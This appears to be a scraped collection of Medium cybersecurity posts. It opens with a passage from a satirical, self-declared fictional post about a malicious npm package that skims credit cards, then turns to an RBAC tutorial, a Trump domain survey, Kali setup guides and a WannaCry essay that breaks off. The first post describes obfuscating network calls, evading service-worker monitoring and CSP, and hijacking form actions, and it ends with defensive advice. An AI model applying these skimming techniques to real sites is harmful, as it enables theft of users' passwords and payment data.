Maybe you’ve got an automated setup filling out payment forms 24/7 and checking for suspect network requests. Good on ya. Are you using PhantomJS, Selenium, WebDriver or friends? Sorry, they all add easily detectable properties to window so I won’t be sending anything out for these setups.
The point is, just because you don’t see it, doesn’t mean it’s not happening. It’s been more than two years and as far as I know, no one has ever noticed one of my requests. Maybe it’s been in your site this whole time :)
(Fun fact, when I go through all the passwords and credit card numbers I’ve collected and bundle them up to be sold on the dark web, I have to do a search for my credit card numbers and usernames in case I’ve captured myself. Isn’t that funny!)
Your innocence warms my heart.
But I’m afraid it’s perfectly possible to ship one version of your code to GitHub and a different version to npm.
In my package.json I’ve defined the files property to point to a lib directory that contains the minified, uglified nasty code — this is what npm publish will send to npm. But lib is in my .gitignore so it never makes its way to GitHub. This is a pretty common practice so it doesn’t even look suspect if you read through these files on GitHub.
This is not an npm problem, even if I’m not delivering different code to npm and GitHub, who’s to say that what you see in /lib/package.min.js is the real result of minifying /src/package.js?
So no, you won’t find my nasty code anywhere on GitHub.
OK now you’re just making up objections. But maybe you’re thinking you could write something clever that automatically checks code for anything suspicious.
You’re still not going to find much that makes sense in my source, I don’t have the word fetch or XMLHttpRequest anywhere, or the domain that I’m sending to. My fetch code looks like this:
“gfudi” is just “fetch” with each letter shifted up by one. Hard core cryptography right there. self is an alias for window.
self['\u0066\u0065\u0074\u0063\u0068'](...) is another fancy way of saying fetch(...).
The point: it is very difficult to spot shenanigans in obfuscated code, you’ve got no chance.
(With all that said, I don’t actually use anything as mundane as fetch, I prefer new EventSource(urlWithYourPreciousData) where possible. That way even if you’re being paranoid and monitoring outbound requests by using a serviceWorker to listen to fetch events, I will slink right by. I simply don’t send anything for browsers that support serviceWorker but not EventSource.)
Oh, do you now.
And did somebody tell you that this would prevent malicious code from sending data off to some dastardly domain? I hate to be the bearer of bad news, but the following four lines of code will glide right through even the strictest content security policy.
(In an earlier iteration of this post I said that a solid content security policy would keep you (and I quote) “100% safe”. Unfortunately 130k people read that before I learned the above trick. So I guess the lesson there is that you can’t trust any thing or any one on the internet.)
But CSPs aren’t completely unhelpful. The above only works in Chrome, and a decent CSP might block my efforts in some lesser-used browsers.
If you don’t know already, a content security policy can restrict what network requests can be made from the browser. It is designed to restrict what you can bring into the browser, but can also — as a side effect — limit the ways in which data can be sent out (when I ‘send’ passwords to my server, it’s just a query param on a get request).
In the event that I can’t get data out using the prefetch trick, CSPs are tricky for my credit card collection corporation. And not just because they neuter my nefarious intentions.
You see, if I try to send data out from a site that has a CSP, it can alert the site owner of the failed attempt (if they’ve specified a report-uri). They would eventually track this down to my code and probably call my mother and then I would be in big trouble.
Since I don’t want to draw attention to myself (except when on the dance floor) I check your CSP before attempting to send something out.
To do this, I make a dummy request to the current page and read the headers.
At this point I can look for ways to get out past your CSP. The Google sign in page has a CSP that would allow me to easily send out your username and password if my code ran on that page. They don’t set connect-src explicitly and also haven’t set the catch-all default-src so I can send your credentials wherever I damn well please.
If you send me $10 in the mail I’ll tell you if my code is running on the Google sign in page.
Amazon has no CSP at all on the page where you type your credit card number in, nor does eBay.
Twitter and PayPal have CSPs, but it’s still dead easy to get your data from them. These two allow behind-the-scenes sending of data in the same way, and this is probably a sign that others allow it as well. At first glance everything looks pretty thorough, they both set the default-src catch-all like they should. But here’s the kicker: that catch-all doesn’t catch all. They haven’t locked down form-action.
So, when I’m checking your CSP (and checking it twice), if everything else is locked down but I don’t see form-action in there, I just go and change the action (where the data is sent when you click ‘sign in’) on all your forms.
Boom, thanks for sending me your PayPal username and password, pal. I’ll send you a thank you card with a photo of the stuff I bought with your money.
Naturally, I only do this trick once per device and bounce the user right back to the referring page where they will shrug and try again.
(Using this method, I took over Trump’s Twitter account and started sending out all sorts of weird shit. As yet no one has noticed.)
Edit: I’ve detailed this in a follow-up post, Part 2: How to stop me harvesting credit card numbers and passwords from your site.
On any page that collects any data that you don’t want me (or my fellow attackers) to have, don’t use npm modules. Or Google Tag Manager, or ad networks, or analytics, or any code that isn’t yours.
As suggested here, you might want to consider having dedicated, lightweight pages for login and credit card collection that are served up in an iFrame.
You can still have your big ol’ React app with 938 npm packages for the header/footer/nav/whatever, but the part of the page where the user is typing should be in a secured iFrame and it should run only hand-crafted (and may I suggest, not-minified) JavaScript — if you want to do client-side validation.
I will soon be posting my annual report for 2017 where I declare my income from stealing credit card numbers and selling them to gangsters in cool hats. I am required by law to show which websites I skimmed the most credit cards from — maybe yours is on the list?
Since I’m a classy guy, anyone on the list who has successfully blocked me from harvesting their data by January 12th will be spared the public shaming.
I know that sometimes my relentless sarcasm can be difficult to unravel by people on the English-learning path (and also people in need of lightening up). So just to be clear, I have not created an npm package that steals information. This post is entirely fictional, but altogether plausible, and I hope at least a little educational.
Although this is all made up, it worries me that none of this is hard.
There’s no shortage of smart, nasty people out there, and 580,000 npm packages. It seems to me that the odds are better than even that at least one of those packages has some malicious code in it, and that if it’s done well, you would never even know.
And here’s an interesting thought experiment: I wrote an npm package last week, a little easing function. Totally unrelated to this post and I give you my word as a gentleman that there is nothing malicious in there. How nervous would you be adding that to your site?
So what’s the point in a post like this? Is it just me pointing and saying “ha, you’re a sucker!”.
No, not at all. (Well, it was to start with, but then I realised I’m a sucker too, so I changed my tune.)
My goal (as it turns out) is simply to point out that any site that includes third party code is alarmingly vulnerable, in a completely undetectable way.
As always, thanks for reading, and keep the comments and corrections coming.
Written by
","['About', 'Help', 'Go Home', 'JavaScript', 'Web Development', 'Programming', 'Cybersecurity', 'Software Development']"
Implement Access Control in Node.js - Security and Node.js,https://blog.nodeswat.com/implement-access-control-in-node-js-8567e7b484d1?source=tag_archive---------0-----------------------,"Most web applications rely on some sort of access control to keep users from accessing information not meant for them. If authentication is a lock on the main door of the hotel, then access control is the individual access card they give to each user for accessing their room.
We have spent quite a few blog posts on various theories about security mechanisms for web applications (Set Up a Secure Node.js Web Application, Unvalidated Redirects, What Do You Know About Clickjacking? etc). In this post we will go beyond theory and take a more hands on approach by building RBAC module from the scratch so we can review our user’s privileges. Our aim, as usual, is to make the web a securer place for everyone.
We will begin with a short recap on access control theory followed by incremental how-to steps for building it.
So let’s get started.
When asking developers to name different access control methods, the usual answer seems to be ACL and RBAC. If you answered this question the same way, then you are also among the misinformed. Let’s look at both of these in turn and then explain why.
ACL or Access Control List is an implementation of access control, usually represented as a table of privileges.
In this table we can see how each user is a row and has specific privileges assigned to them. Upon access control check, the user’s row and the column in question are cross-checked — this determines if this user has access or not.
RBAC or Role Based Access Control is an access control method where users are given roles and the roles determine what privileges they have. It is usually described as a tree or diagram, as roles can inherit accesses from their parent roles. So our previous ACL table could look something like this:
These are the common understandings of ACL and RBAC and they are both incorrect. And here’s why:
First of all, ACL is not an access control model, but an implementation type. It is often confused with IBAC (Identity Based Access Control) where each individual has their access rights determined separately — based on identity.
That sounds very much like the ACL we described earlier. However, ACL variations like ACLg can also be used to implement RBAC access model. We simply substitute the individual for a group. As a result we end up with:
This means ACLg (g stands for grouped) is equivalent of RBACm (m stands for minimal). You might be wondering where is the hierarchy in this model. Well there isn’t any. RBAC doesn’t have hierarchy written in the basic definition — it is an added extra in a model referred to HRBAC (Hierarchical Role Based Access Control).
So to recap: ACL is not an access control model, but an implementation type and RBAC does not have hierarchy by the baseline definition.
Now that we have determined that we have some misconceptions about the most popular access control methods, let’s take a look at what types of access control there actually are. By the end of this section you should have an overview of the common access control methods and how they differ.
MAC/DAC (Mandatory/Discretionary Access Control) — although completely separate access control methods, I grouped them together as these two only differ in one important aspect. Both focus on the data object as the center of access rights. Discretionary access control method can most readily be seen in UNIX systems, where the owner of any given file has control over whom to give access. The access rights are in his/her discretion — hence the name. MAC also focuses on the data object as the basis of access rights, however the rights are not determined by the owner, but instead by the sensitivity of the data object. This method is most often seen in governmental or military systems due to the high costs of implementation.
In short MAC and DAC both focus on the data object or file, whereas DAC allows me (the owner of the file) to determine who has access. In MAC however the access rights are determined by the administrator or general rule.
IBAC (Identity Based Access Control) — this method focuses on the identity of the user as the basis of the privileges. Each individual is given specific access rights for every operation. The benefits are high granularity in assigning rights and simplicity in systems with a few users. However as systems grow in user numbers, then it usually gets difficult to manage.
RBAC (Role Based Access Control) — tries to solve the limitations of IBAC management in large systems by mimicking the real world needs more closely. Operational privileges are grouped into roles and each user is assigned a role. The role, instead of the individual, is the basis for access checks. It is often implemented in a hierarchical model, where higher level roles inherit the privileges from lower levels. RBAC sacrifices granularity for higher maintainability in systems with lots of users.
ABAC (Attribute Based Access Control) — is an evolution of RBAC that tries to solve some shortcomings in specific situations. In systems where there are many attributes that separate access to internal resources (i.e. has the user passed some tests and been educated in the use of this part of the system etc), using the RBAC model would result in what is known as the role explosion — a need to define all the roles that separate users based on their attributes. ABAC aims to solve this problem by providing a framework for defining access rights based on the various properties of a user.
Hope you found these detailed nuances useful? In the next section we will take a closer look at the most popular access control method of the web — RBAC.
RBAC or Role Based Access Control is an access control method where each identity is assigned a role and the roles determine what access rights the identity has. This is opposed to IBAC, where each identity has separate privilege assignment. RBAC looses some granularity compared to IBAC, however it gains better manageability in environments with large amounts of users.
RBAC is usually implemented as a Hierarchy of roles (HRBAC). This allows roles to inherit privileges from other roles, which in turn makes it easier to add new operational privileges to the whole tree.
Let’s envision an app where we have three roles: ‘Guest’, ‘Writer’, ‘Manager’. We can then illustrate the role hierarchy as follows:
If we now want to add an edit operation, which is allowed for both writer and manager, then all we have to do is extend the writer role:
The definition of roles is also a welcome feature during application development. By separating users into well defined categories beforehand we are more easily able to model the application security.
In short RBAC is the de-facto standard access control method for most web applications. Mainly because building a web app means that you expect to handle a vast amount of users — thousands, millions even billions (one can dream). Implementing IBAC in this situation would result in enormous data duplication for access rights.
Now that we are more familiar with the logic behind RBAC, we can proceed with our plan to build a RBAC module.
Having theoretical knowledge about access control is nice, but unless put to use, we could have spent our time watching pictures of cute kittens instead. So let’s not stop there and let’s start building
The logic of a basic RBAC model is simple — you define a number of roles and each role has privileges assigned to it. When checking for access you check if the role has access and that’s it.
So our example from before can be summed in two tables:
We can achieve this model fairly easily in JavaScript — let’s create a model of the roles and a function to check them.
And now we have a very simple role system. Let’s give it a configurable and reusable form in the manner of a class.
This leaves us with a very simple module for defining and checking roles. Let’s not stop here — we will add hierarchy to the model so that we can manage roles more easily when adding new operations to the system.
This way there is no need to define rights to every operation for each role separately.
It’ll allow the user to represent a list of child roles, where to inherit permissions from.
And then we have to rewrite the access check functionality. In HRBAC model, the access checking begins with the current role, checks if it has access, if not then moves up to the parent and checks again. This happens until a permission is found or there are no more parents to check. So we can rewrite our checking functionality to use recursive logic:
Now we have roles, inheritance and a function to bring it together. Almost done, but not quite there yet. There are still real use cases that we haven’t accounted for. Let me give you an example based on a blogging platform where a writer can create a blog post and then open it up for editing — should the writer role also allow to rewrite every post in the system? Probably not. We need to first check if they are the owner of the post. But how can we write that into a reusable definition — functions? To answer this, let’s allow operations to define functions that need to pass.
So to extend our existing model of roles:
But now our check function also needs to be rewritten — we can no longer use indexOf either. Let’s create a function to normalise our input for better internal use:
And now we can use the map we created in our check function:
Awesome! We now have RBAC class that we can use to check our defined hierarchy model. Additionally, we can also define functions to do dynamic checks for specific access:
We are still not done. Let’s not forget that we are dealing with Node.js so synchronous solutions are not the best way to go — we need async so that we can instantiate the class with information found in the database. Or we might want our access check to look something up from the file system, other API or somewhere else. Point is — we need it.
We can provide this in two ways — with promises or callbacks. Because we want to be supportive of both styles let’s implement both. However transformation from Promise to callback is much easier than vice versa so we’ll use Promises internally.
We’ll start our update with the check function. Let’s use the Q module to provide backwards compatibility. We can just wrap the contents of our function in a promise constructor:
We can then handle callbacks by optionally binding the handlers for our promise.
We can internally handle the resolve/reject events, by specifying a callback ourselves
And we can handle the inheritance by creating a new promise. One that resolves when any one of the child promises resolves — aka use Q.any.
After adding some type checks, our can function could look something like this:
Now we are almost done. The last thing we want to support is asynchronous loading of the definitions of roles. This means we have to handle the initialisation. The easiest way to accept a function as an input that can return the configuration object after obtaining it somewhere. To do this, let’s add a check in the beginning of init function and store the resolve state in a variable:
And add $this._inited = true before the return statement.
Now we can check at the beginning of the can function if we have managed to set up our roles and act accordingly:
And now we are done on the functionality part.
In the previous section we built a nice and simple access control module that I have published under the name easy-rbac. In this section we will look at how to add proper role based access control to an express application using a combination of easy-session (a session handling module I have written some time ago) and easy-rbac (the module we built, which is now integrated to easy-session).
First we will set up an express application with easy-session and a few routes for us to test our sessions:
Now we have our base setup, but what if our application is expanding — we are adding functionality to read and write blog posts; everyone can read and writers can write? We could do it by checking the role like this:
This is, however, one of the most common mistakes made in implementing RBAC — looking for specific roles instead of validating operations. It is not scalable. What happens when we create new roles that are also supposed to be able to create blog posts? We would have to come back and rewrite this logic all the time. Not good.
Instead, we should be focusing on operations — roles can be added, hierarchies change, but if we always check for ‘post:create’ (the notation ‘blog:create’ has no technical implementation value, the semantics just help organise and keep a consistent naming), then we won’t have to change our code. But in order to do that, we will need to configure our integrated easy-rbac.
Or if we want to store our role logic in the database layer, so that it is centralised across application instances, we can set up an async function to retrieve it:
And now we can check for the right to create blog posts.
Even better, let’s move the validation into a middleware to keep our logic clean.
Awesome — heading in the right direction. Let’s now set up an edit path as well. However, here we can’t just check if the user is a writer any more. I wouldn’t want some other writer to change my posts. So we are going to have to set up conditions by changing the writer’s role definition:
We’ll also need the user on the session object:
And finally we need a way to look up a blog object and test if we can actually edit:
Again we can do this with middleware
And there we have it. A nice access control setup that we can easily reuse throughout our application.
In this post we looked at various access control methods and debunked some common misconceptions along the way. You should now know the key methodologies and how they differ.
In the second half we got our hands dirty. We started by coding an access control module and then implemented access control for a simple test application using easy-session. All in a days work.
In the future, you should know to avoid checking roles directly and focus on operations instead. Also, I sincerely hope that you won’t forget to add access checks where needed.
If you found this post useful and want a more thorough overview of authentication, access control methods and other Node.js security topics, I recommend you read my book Secure Your Node.js Web Application: Keep Attackers Out and Users Happy
Written by
","['JavaScript', 'Nodejs', 'Cybersecurity']"
Incognito Mode Won’t Keep Your Browsing Private. Do This Instead.,https://medium.com/fast-company/incognito-mode-wont-keep-your-browsing-private-do-this-instead-dd64bc812010?source=tag_archive---------0-----------------------,"By Michael Grothaus
The big tech giants, online advertising companies, and data brokers use a ton of tricks to track you around the web. These include things like cookies…
Written by
","['Privacy', 'Cybersecurity', 'Internet', 'Technology', 'Browsers']"
"Inside Donald Trump’s 3,000 Bizarre Domains - piss.io",https://piss.io/inside-donald-trumps-3-000-bizarre-domains-996871e602b0?source=tag_archive---------1-----------------------,"The first evening of the RNC was a spectacle. Viewers were treated to a variety of characters all making the case for Trump in their own way, and naturally, a new controversy came with nearly each segment of the show. It was a fascinating window into what day-to-day Donald Trump could be like, given the GOP at his side. In all, the night was a fitting extension of Trump’s abrasive and scattershot overall strategy.
I don’t presume to be a political writer. Thousands of smarter people are already analyzing almost every angle of Donald Trump and his actions. Something I haven’t really seen touched on is Trump’s online strategy — not so much his unfiltered Twitter account or legion of supporters, but his entire online strategy. Before the campaign and before Twitter, how did The Donald operate online?
Turns out, it’s pretty interesting.
Donald Trump owns a ton of domains. Or more accurately, The Trump Organization does. A little while back I got my hands on the full list of around 3,200 and decided to sort through them in order to find out which ones are being used, which aren’t, and to see if there’s anything of note hidden in there.
Before we get into the domains which actually have sites, we should go over the lion’s share of the domains which are parked at a registrar. Many are slight variations on existing business ventures (over 70 are for Trump’s Doral golf destination alone) and some are for brand protection, but there are also a handful which are a little interesting. Among these are:
3dtrump.com, complaintotrump.com, donaldcasinostar.com, donaldtrumpangels.com, donaldtrumpart.com, donaldtrumpbedding.com, donaldtrumpbasicbedding.com, donaldtrumpblog.com, donaldtrumpcandles.com, donaldtrumpcarpet.com, donaldtrumpcrystal.com, donaldtrumpheadwear.com, donaldtrumpjr.asia, donaldtrumpmattress.com, donaldtrumpofficechair.com, donaldtrumpwontshutup.com, gettrumpbonus.com, how-to-build-a-fortune.com, imbeingsuedbythedonald.com, incrediblechristmas.com, intrumpwetrust.com, ivankabathroom.com (in fact, dozens of Ivanka-related home and bath furnishings domains), meettrump.com, no2trump.com, nomoretrump.com, playwithdonald.com (gross), trumpadvice.com, trumpaudio.com, trumpauto.com, trumpcalendars.com, trumpcandlecollection.com, trumpcellgame.com, trumpcertification.com, trumpchampaign.com, trumpdoll.com, trumpfire.com, trumpgrapes.com, trumphand.com, trumpinfotech.com, trumpisfired.com, trumpishired.com, trumpitup.com, trumprecords.com, trumpredwine.com, trumpsoda.com, trumptables.com, trumptats.com, trumpupgrade.com, trumpvan.com, trumpwater.com, womanwhowork.org, youandtrump.com
It’s not clear whether some of these are potential future business plans (Trump Auto? Trump Soda? Trump Candles?) but keep your eyes peeled for Donald Trump’s “TrumpTats” tattoo empire just in case.
Several domains feature words like ‘sucks’ or ‘fraud’:
donaldtrumpnetworkfraud.com, donaldtrumpnetworksucks.com, donaldtrumpnetworkscam.com, trumpfraud.com, trumpscam.com, trumpnetworkmarketingsucks.com, trumpfraud.info, thetrumpnetworksucks.com, trumpnetworkmarketingscam.com
Most of these directly reference The Trump Network, one of Trump’s more well-publicized multi-level marketing failures, which left a number of its unfortunate marks filing for bankruptcy. Someone within The Trump Organization saw fit to buy up these disparaging domains just in case one of the victims were to financially recover enough to scrounge together a $9.95 domain registration fee sometime in the future.
One piece of Donald trivia is that he’s never had a drop to drink in his life. That’s all well and good, to each their own, but I can’t think of any quality that makes a person less qualified to sell their own line of booze than being a teetotaler. In 2006 — entirely unconcerned that he had no idea what he was talking about — Donald Trump introduced his own line of vodka. Despite OK-to-decent reviews taste-wise, within a handful of years it had disappeared from shelves due to mismanagement and lack of payment to business partners. The whole operation totally folded, and to this day Donald Trump declines to speak to reporters on his vodka venture. Its slogan was “Success Distilled” for some reason.
The ghost of Trump Vodka lives on, however: A number of domains redirect to the exact URL http://www.trump.com/Merchandise/Trump_Vodka.asp.
donaldjtrumpoffice.com, donaldtrumpoffice.com, ihatetrumpvodka.com, trump-vodka.com, trumpartcollection.com, trumpbloodymary.com, trumpcocktail.com, trumpcosmo.com, trumpdrinks.com, trumponice.com, trumpontherocks.com, trumporg.biz, trumporg.info, trumporg.org, trumporg.us, trumppunch.com, trumpscrewdriver.com, trumpselect.com, trumpthevodka.com, trumptnt.com, trumpvodkasucks.com, trumpwithatwist.com, trumpandoj.com, yourefiredvodka.com
Although the vodka page is long gone and visitors are redirected to the trump.com root site, those redirects still exist. And why do unrelated domains like DonaldTrumpOffice.com and TrumpOrg.biz attempt to take visitors to a vodka-specific page? Hell if I know. But I do know that the domain TrumpAndOJ.com is definitely not a winner for a few reasons.
You’ve probably heard of Trump University, an “education” “company” which operated for a few years promising real estate success to students who fork over 5 figures. The New York State Department of Education reminded Trump that, aside from other complaints, using the word “University” in the name of your business suggests you actually teach people things, and the necessary charter and license would be required to call yourself a university. Trump cleverly countered this by changing the name of the business to The Trump Entrepreneur Initiative. A number of domains related to Trump U still exist and redirect to tracking URLs under TrumpUniversity.com, which then pipe you over to The Trump Initiative:
fasttrackforeclosure.com, trumprealestateinvesting.com, trumpopportunity.com, trumpwealthbuilding101.com, trumpforeclosureinvesting.com, trumpfundamentals.com, trumpopportunities.com, trumppossibilities.com, trumpsolutions.com, trumpcourses.com, trumpprobate.com, trumplaunchpad.com, freetrumpevent.com, trumpsummit.com, trumpuniversityok.com, trumpinvesting.com, trumprsvp.com, trumpeventrsvp.com, trumpbonus.com, trumpbonus3.com, trumpbonus4.com, trumprealestateworkshop.com, trumpsuccessworkshop.com
If TrumpBonus, TrumpBonus3 and TrumpBonus4 all exist, what happened to TrumpBonus2? That one is one of several other domains which redirect directly to TrumpInitiative tracking URLs, without first going through the old TrumpUniversity domain:
trumpprotege.com, trumpulive.com, trumpbonus2.com, trumplaborlando.com, trumplabca.com, trumpexpoga.com, trumpstarter.com, trumpstarterkit.com, trumpliveexpo.com, trumpwealthsummit.com
As for why some go to one domain and others to the other, I really don’t know other than to say that this is all a massive, tangled mess with little to no rhyme or reason.
Amid all the scrutiny and legal action, TrumpInitiative.com is now defunct. But instead of any sort of traditional message — something along the lines of “Thanks for your support / We’ll be back” etc. — they have instead decided to take down the member login form and replace it with… a picture of the login form. When I tried to click on the form and realized it was a jpeg I felt like Wile E. Coyote running full-speed into a painting of a tunnel.
Business lesson: Instead of doing anything that may remotely suggest an admission of wrongdoing or defeat, it’s better to just put up a facade and declare that you’re still on top.
Another curiosity is TrumpWorldwide.com, which displays a visibly blank page but has the following HTML title and meta tag:
<title>TrumpWorldwide.com The Vision of Undefined Perfection Worldwide </title><META name=”description” content=”Donald Trump and Trump University in are GIVING AWAY a free e book and DVD on Real Estate. If you want advice, Go to the best! Its Free! Click Now!”>
Bizarre offer aside, I’d never heard the phrase “undefined perfection” before so I googled it. Sure enough, aside from a tumblr and some art things, the phrase is used to describe Machiavelli in the book Machiavelli in the British Isles: Two Early Modern Translations of The Prince. Probably a coincidence.
trumprestraurants.com, trumpstores.com, trumpicecreamparlor.com, trumpshop.com, trumprestaurants.com, trumptowerrestaurants.com, trumpicecream.com, trumprestaurant.com, trumpcatering.com, trumpbuffet.com
If this whole election thing doesn’t work out, at least we’ll have Donald Trump Ice Cream and Donald Trump Buffet restaurants. These sites all display a “Please come back later” text placeholder, suggesting dinner and treats are on the way. Shop.IvankaTrump.com, IvankaClothing.com and IvankaEBoutique.com aren’t afforded even that dignity — they only show the default Apache install page.
Of the relatively few domains which are being used and serving unique sites, they run the spectrum in amount of basic web security features. DonaldJTrump.com — the campaign’s official site — scores the best of the lot with a CSTAR score of 824. This is within the realm of reasonability for a major web destination which solicits visitor information and money. A lot of other campaigns scored much worse. TrumpHotelCollection.com, the hotel family’s flagship site, also does well with a 798.
It gets worse pretty quickly. Bioceutica.com — the multi-level marketing scam which TrumpNetwork.com now redirects to — scores in the mid-200’s. Donald’s favorite resort, The Mar-a-Lago Club, has a 352. Most if not all of his golf course sites appear to have been made by the same web developer (the dated graphics and same gold tones everywhere suggest this), and score similarly. Melania’s site, MelaniaTrump.com, starts with a huge photo of her, then displays a slightly smaller photo of her and some pictures of jewelry. It scores a 295. Some sites are cared for a little more than others.
The enterprising young Donald J. Trump, Jr. recognizes an opportunity when he sees one and has been collecting the valuable ad clicks of randos typing his name into their address bars for a while now, amassing a fortune of three, maybe four dollars. No, this isn’t the work of a squatter — The Trump Organization definitely owns this domain:
In looking at the domains it buys and the sites it runs, it would appear the Trump Organization is awash in half-baked impulses, poor management, little-to-no planning and is more concerned with its own vanity than any sort of substance or quality. In other words, it’s par for the course.
Header adapted from photo by Gage Skidmore, CC BY-SA 2.0 license.
Written by
","['Donald Trump', 'Internet', 'Cybersecurity']"
Installing Kali Nethunter on Android “without Root”,https://medium.com/@pankaj_kumar_singh/installing-kali-nethunter-on-android-without-root-194aa0a9d1a1?source=tag_archive---------3-----------------------,"Don’t worry, it isn’t a lot that you need.
In order to go on with the installation process you should:
A bit weird name though for such a cool app.
Steps for Installation:
And you have your hacking machine right on your tips…������
REDHAWK Tool can be installed on Kali. This is beyond the scope as of now.
If you are looking for ubuntu OS to be installed on your phone, you can follow the steps from the below link:
https://github.com/Neo-Oli/termux-ubuntu
>>This installation is a very basic version and hence you won’t find a lot of tools like nmap, metasploit, Red Hawk or any other pentesting tool, therefore we need to install it manually.
Please Note: since the phone is not in root mode, there might be errors on running tools which require elevated privileges.
Hi, I am Pankaj Kumar Singh. A developer and Infosec Enthusiast . This is my first article. If you find any issues regarding the post feel free to reach out to me. Will be happy to resolve any issues. You can find me on Linkedin and GitHub. Or just drop a mail to singhpankajkumar65@gmail.com.
Written by
","['Hacking', 'Kali Linux', 'Cybersecurity', 'Security', 'Android']"
Installing TP-Link Archer T2UH (AC600) on VMWare for Kali Linux,https://medium.com/@honsontran/installing-tp-link-archer-t2uh-ac600-on-vmware-for-kali-linux-4fa2db52cd69?source=tag_archive---------1-----------------------,"I’m sure for the majority of everyone reading this article (including myself), we have struggled to get Kali Linux working with the Archer T2UH on Kali. You’ve probably Googled endlessly many blogs, sites, and YouTube videos to try to get your adapter working. Well, (hopefully), your search ends here.
After 6 hours of researching and troubleshooting, I have finally gotten my T2UH working.
Just for clarification, this is the dongle I have ordered on Amazon to hook up to Kali.
Initially, I have followed this YouTube video:
For those who have tried all the solutions mentioned in the comments such as:
After endlessly going through forum after forum, the quickest and easiest fix is to just download the VM from Kali here (download the VMWare or the VirtualBox depending on what you are using):
After this, simply extract the .zip file that you have downloaded and follow the same instructions in the video. For those who don’t want to watch the video, simply follow these steps.
After this, to log into Kali, your username at default should be “root” as the username, and “toor” as the password.
cd Downloads/mt7610u_wifi_sta_v3002_dpo_20130916-mastermakemake install
Now, this is where those who are trying to get this working on VMWare get stuck. The next command typed is:
ifconfig ra0 up
This command essentially tells the WiFi adapter to enable itself. After the driver installation, this error usually shows up after typing in that terminal command.
SIOCSIFFLAGS: Operation not permitted
This is to enable the WiFi adapter for use in Kali. However, we must first have the adapter plugged in as well as allow the VMWare access to this adapter. For this go to your VMWare program, and on the top left menu bar (with Kali running), go to:
VM>Removable Devices>Ralink WiFi>Connect
You should notice that your adapter is now disconnected in from your PC, and actually directly connected to Kali. You can also observe this in the terminal by typing:
lsusb
Now, we have to change our connection settings. By default, VMWare usually shares the same internet connection as your actual PC’s OS (maybe it’s through Ethernet, or even through WiFi) via NAT.
Our goal right now is to change this to bridged. Go to:
VM>Removable Devices>Network Adapter>Settings…
Now, set it to these settings:
Click okay to confirm settings.
Lastly, we have to change the config file for our network manager, and also rename our driver file.
Now, we need to make a copy of this same folder you see above. However, we have to rename this folder from “RT2860STA” to “RT2870STA”. Likewise, rename RT2860STA.dat inside the new folder and rename it to RT2870STA.dat.
Now, it’s time to test this. Try:
ifconfig ra0 up
once more. If it shows no error and gives you another input line, then congrats! You can check that it’s up by typing in:
ifconfig
You should see something like this:
Notice how ra0 is not broadcasting and up and running. Your WiFi adapter should be up. Click the power button on the top right of the Kali desktop and you should see there is a new button to connect to WiFi.
If you don’t see it, a quick restart of the network manager will aid in fixing the issue.
Everytime you restart or shut down the VM instance that is running, you will have to just repeat a variation of the above note.
Connect to your network. Check that your internet is working by going to the terminal and typing something to access such as:
ping google.com
If you are seeing responses, you are set!
Although this seems like a lot of work for the initial setup, every time you boot back into Kali, re-enabling the adapter isn’t too bad. You’ll get the hang of what your computer likes and doesn’t like after a while.
Best of luck to everyone, and remember to follow this Medium ;)
YouTube tutorial coming soon ;D….
Written by
","['Linux', 'Technology', 'Kali Linux', 'Computer Science', 'Cybersecurity']"
Internet of Wilderness of Mirrors - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/internet-of-wilderness-of-mirrors-9eaa24bd99d8?source=tag_archive---------9-----------------------,"The evidence is mounting up that the WannaCry worm was developed by the Lazarus group (tied to North Korea.) I was initially skeptical of the attribution, it didn’t feel right. But there are stronger links now, and there is a plausible narrative that fits the available facts. I’m willing to accept Lazarus group as the source. A North Korean APT ransomware using US APT exploits released by a Russian APT. (Who says international cyber cooperation needs more work?)
If it is true that DPRK released the WannaCry worm, why did they do it? As a money making scheme it is inept. It seems half-baked in many ways — no ability to handle a mass infection event, a poorly thought out “kill switch” — this is a very weird move for a national level cyber threat actor. Still, the available public evidence is pointing that way...
Evaluating a potential threat means looking at their capabilities, intent and opportunity to perform the attack. Anyone would have the capability to write crappy ransomware, and the bar for opportunity is set to “has internet connection”…so, what could be the intent? This was the big problem with the Lazarus group attribution. They seem to lack a reason to make shitty ransomware to collect $300 bucks a pop. Why not just use the SWIFT malware and attacks they’ve been using for years to keep stealing millions?
Then the evidence started to come in. For example, despite the huge public attention and the massive law enforcement (and SIGINT) resources that are being thrown at the authors of this attack, they still seem to be operating rather than trying to cover their tracks and vanish (like anyone with this much heat on them would).
The authors were still busy fixing bugs when it exploded beyond their ability to handle the infection rate, and the impact on high profile targets made it too hot to handle for anyone with anything to lose…
The SMB injector only works against Windows 7 and Windows 2008 R2. It is broken against other targets, such as Windows XP. Very poor development work, or an early stage of development before the big unveiling.
Indeed, Microsoft have confirmed that they haven’t seen any XP infections in the wild.
Schtop! This ransomware is not ready yet!
The several variants released in short time; the poor performance (only infecting Windows 7 and 2008 R2); the missing infrastructure to handle support and payment to decryption workflow; the weird kill switch; the slow spread of an earlier variant using a shitty ancient propagation technique… This is software still in development that escaped.
Here’s what I think happened. The Lazarus group (or someone with their source code) starts branching out into ransomware. They’re planning on some small slow below the radar spread, low payment ($300), probably only hitting a few hundred machines over a few weeks. It requires essentially manual install inside a LAN and then luck to hit open file shares that allow remote execution.
After toying with this for a week or so, they replace the “SMB open share exec” infection routine with “ETERNALBLUE” because, hey, it’s also an SMB infection vector. Maybe they read “11 ways to turbocharge your ransomware” and “Number 8: Automate, don’t manually install” really resonated with them?
And then, the wheels fell off. It explodes out of control, beyond the infection volume they can handle. To make matters worse, the damn thing hits high profile targets (hospitals) in a western country that generates a flood of media coverage.
The infosec industry was quick to respond. Small groups of researchers worked to understand and mitigate against the attack, and frothy marketing departments went into overdrive talking about ransomware. It is embarrassing and shameful how so many companies reveal themselves for the ambulance chasers that they are.
My initial skepticism of the North Korean attribution was based on a lack of Intent. There is no obvious reason that they would want to do such a low volume cash generation activity (they steal millions, not hundreds.) On the other hand, the timing of the attack and the immediate (and predictable) backlash against the NSA suggested a political motivation for “the cyber worm based on NSA cyber hacking cyber weapons!!!1!1”
Multiple people had the same thought. The politics of this was way too convenient. The day after the first wave of media attention the Russians (via their ShadowBrokers attribution front) issued a particularly lengthy post distancing themselves from the attack and blaming North Korea (among other things.) Very convenient timing, and very fast attribution — blaming DPRK for a [beta quality] ransomware worm that used NSA exploits (released by ShadowBrokers.) A false flag attack with the intent of damaging morale and capability at the NSA seemed much more plausible.
